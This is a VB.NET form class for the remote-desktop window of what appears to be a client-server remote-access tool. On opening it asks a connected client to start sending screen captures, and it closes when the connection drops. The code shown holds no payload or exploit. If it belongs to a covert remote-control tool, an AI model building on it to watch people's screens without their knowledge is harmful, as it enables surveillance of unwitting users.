Imports System.ComponentModel

Public Class RemoteDesktop
    Public F As Form1
    Public C As Client
    Public isOK As Boolean = False
    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Button1.PerformClick()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If Button1.Text = "OFF" Then
                Button1.Text = "Capturing..."
                Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.RemoteDesktopSend), Me.Width, Me.Height)
                Pending.Req_Out.Add(ClientReq)
            Else
                Button1.Text = "OFF"
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Not C.IsConnected Then
                Me.Close()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RemoteDesktop_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        If isOK = False Then
            isOK = True
            Dim ClientReq As New Outcoming_Requests(C, CByte(PacketHeader.RemoteDesktopSend), Me.Width, Me.Height)
            Pending.Req_Out.Add(ClientReq)
        End If
    End Sub

    Private Sub RemoteDesktop_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        isOK = False
    End Sub

End Class